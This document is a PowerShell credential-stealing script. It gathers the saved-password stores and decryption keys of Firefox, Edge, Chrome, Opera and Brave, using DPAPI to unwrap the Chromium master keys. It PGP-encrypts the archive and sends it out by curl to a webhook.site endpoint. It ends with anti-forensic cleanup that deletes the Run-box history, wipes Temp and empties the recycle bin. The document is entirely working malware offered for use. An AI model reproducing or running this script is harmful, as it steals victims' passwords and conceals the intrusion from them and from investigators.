#
# ---
# Setup
# ---
#
# Install the NuGet provider to be able to install PSPGP
Install-PackageProvider -Name NuGet -Force -Scope CurrentUser
# Install & import PSPGP
Install-Module -Name PSPGP -AllowClobber -Force -Scope CurrentUser
Import-Module PSPGP
# Load a .NET assembly that will be used to get Chromium based browser credentials
Add-Type -AssemblyName System.Security
# Create the directory that will be used during the attack
New-Item ~\Attack\Extract -itemType Directory

#
# ---
# Firefox Grabber
# ---
# Decryption of the passwords is done after the data is exfiltrated
#
# Create the directory that will store the credentials
New-Item ~\Attack\Extract\Firefox -itemType Directory

# Get the path to every logins.json file containing saved passords
$P = Resolve-Path ~\appdata\roaming\mozilla\firefox\profiles\*\logins.json
# Copy every logins.json file to the extraction folder
$N = 0
foreach ($I in $P) { 
	Copy-Item $I -Destination ~\Attack\Extract\Firefox\logins_$N.json
	$N++
	}

# Get the path to every key4.db file containing the key to decrypt the passwords
$P = Resolve-Path ~\appdata\roaming\mozilla\firefox\profiles\*\key4.db
# Copy every key4.db file to the extraction folder
$N = 0
foreach ($I in $P) {
	Copy-Item $I -Destination ~\Attack\Extract\Firefox\key4_$N.db
	$N++
	}

#
# ---
# Edge Grabber
# ---
#
# Decryption of the passwords is done after the data is exfiltrated
#
# Create the directory that will store the Edge credentials
New-Item ~\Attack\Extract\Edge -itemType Directory

# Get the encryption key that will be used to decrypt the passwords
$EncryptedKey = (Get-Content -Raw '~\AppData\Local\Microsoft\Edge\User Data\Local State' | ConvertFrom-Json).os_crypt.encrypted_key
# Decode it from Base64
$EncryptedKey = [System.Convert]::FromBase64String($EncryptedKey.ToString())
# Remove the DPAPI header by removing the first 5 caracters
$EncryptedKey = $EncryptedKey[5..$EncryptedKey.Length]
# Decrypt the key
$EncryptionKeyData = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedKey,$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
# Write the key to a file
$P = Resolve-Path '~\Attack\Extract\Edge'
$P = $P.ToString()+'\Key'
[IO.File]::WriteAllBytes($P, $EncryptionKeyData)

# Get the path to every Login Data file containing saved passords
$P = Resolve-Path '~\AppData\Local\Microsoft\Edge\User Data\*\Login Data'
# Copy every Login Data file to the extraction folder
$N = 0
foreach ($I in $P) { 
	Copy-Item $I -Destination ~\Attack\Extract\Edge\Credentials_$N
	$N++
	}

#
# ---
# Chrome Grabber
# ---
#
# Decryption of the passwords is done after the data is exfiltrated
#
# Create the directory that will store the Chrome credentials
New-Item ~\Attack\Extract\Chrome -itemType Directory

# Get the encryption key that will be used to decrypt the passwords
$EncryptedKey = (Get-Content -Raw '~\AppData\Local\Google\Chrome\User Data\Local State' | ConvertFrom-Json).os_crypt.encrypted_key
# Decode it from Base64
$EncryptedKey = [System.Convert]::FromBase64String($EncryptedKey.ToString())
# Remove the DPAPI header by removing the first 5 caracters
$EncryptedKey = $EncryptedKey[5..$EncryptedKey.Length]
# Decrypt the key
$EncryptionKeyData = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedKey,$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
# Write the key to a file
$P = Resolve-Path '~\Attack\Extract\Chrome'
$P = $P.ToString()+'\Key'
[IO.File]::WriteAllBytes($P, $EncryptionKeyData)

# Get the path to every Login Data file containing saved passords
$P = Resolve-Path '~\AppData\Local\Google\Chrome\User Data\*\Login Data'
# Copy every Login Data file to the extraction folder
$N = 0
foreach ($I in $P) { 
	Copy-Item $I -Destination ~\Attack\Extract\Chrome\Credentials_$N
	$N++
	}

#
# ---
# Opera Grabber
# ---
#
# Decryption of the passwords is done after the data is exfiltrated
#
# Create the directory that will store the Opera credentials
New-Item ~\Attack\Extract\Opera -itemType Directory

# Get the path to every Local State file containing the key
$P = Resolve-Path '~\AppData\Roaming\Opera Software\*\Local State'
# Copy every Local State file to the extraction folder
$N = 0
$P1 = Resolve-Path '~\Attack\Extract\Opera'
$P1 = $P1.ToString()+'\Key'
foreach ($I in $P) { 
	# Get the encryption key that will be used to decrypt the passwords
	$EncryptedKey = (Get-Content -Raw $I | ConvertFrom-Json).os_crypt.encrypted_key
	# Decode it from Base64
	$EncryptedKey = [System.Convert]::FromBase64String($EncryptedKey.ToString())
	# Remove the DPAPI header by removing the first 5 caracters
	$EncryptedKey = $EncryptedKey[5..$EncryptedKey.Length]
	# Decrypt the key
	$EncryptionKeyData = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedKey,$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
	# Write the key to a file
	$P2 = $P1+'_'+$N
	[IO.File]::WriteAllBytes($P2, $EncryptionKeyData)
	$N++
	}

# Get the path to every Login Data file containing saved passords
$P = Resolve-Path '~\AppData\Roaming\Opera Software\*\Login Data'
# Copy every Login Data file to the extraction folder
$N = 0
foreach ($I in $P) { 
	Copy-Item $I -Destination ~\Attack\Extract\Opera\Credentials_$N
	$N++
	}

#
# ---
# Brave Grabber
# ---
#
# Decryption of the passwords is done after the data is exfiltrated
#
# Create the directory that will store the Brave credentials
New-Item ~\Attack\Extract\Brave -itemType Directory

# Get the encryption key that will be used to decrypt the passwords
$EncryptedKey = (Get-Content -Raw '~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State' | ConvertFrom-Json).os_crypt.encrypted_key
# Decode it from Base64
$EncryptedKey = [System.Convert]::FromBase64String($EncryptedKey.ToString())
# Remove the DPAPI header by removing the first 5 caracters
$EncryptedKey = $EncryptedKey[5..$EncryptedKey.Length]
# Decrypt the key
$EncryptionKeyData = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedKey,$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
# Write the key to a file
$P = Resolve-Path '~\Attack\Extract\Brave'
$P = $P.ToString()+'\Key'
[IO.File]::WriteAllBytes($P, $EncryptionKeyData)

# Get the path to every Login Data file containing saved passords
$P = Resolve-Path '~\AppData\Local\BraveSoftware\Brave-Browser\User Data\*\Login Data'
# Copy every Login Data file to the extraction folder
$N = 0
foreach ($I in $P) { 
	Copy-Item $I -Destination ~\Attack\Extract\Brave\Credentials_$N
	$N++
	}

#
# ---
# Exfiltrator
# ---
#
# Link the public key used to encrypt the data
# for keys in keys.openpgp.org it should be https://keys.openpgp.org/vks/v1/by-fingerprint/<FINGERPRINT>
$PubKey = 
# Link to the webhook page to exfiltrate the data
# for Webhook.site it should be https://webhook.site/<UNIQUE_IDENTIFIER>
$Webhook = ""
# Make an archive from the extraction folder
Compress-Archive -Path ~\Attack\Extract -DestinationPath ~\Attack\Package.zip
# Get public key to encrypt the archive
Invoke-WebRequest -Uri $PubKey -OutFile ~\Attack\pk.asc
# Protect-PGP has issues finding the public key so giving it the full path
$P = Resolve-Path ~\Attack\pk.asc
# Encrypt the archive
Protect-PGP -FilePathPublic $P -FolderPath ~\Attack\Package.zip
# Exfiltrate the encrypted archive
$P = Resolve-Path '~\Attack\Package.zip.pgp'
$P = 'file=@'+$P.ToString()
curl.exe  -F $P $Webhook

#
# ---
# Cleanup v1.2
# ---
#
# Remove the directory that was used during the attack
Remove-Item -Path ~\Attack -Recurse
# Uninstall-Module PSPGP -Force
# Remove-Item -Path ~\AppData\Local\PackageManagement\ProviderAssemblies\nuget -Recurse
# Delete the contents of Temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
# Delete the run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
# Delete the contents of the recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue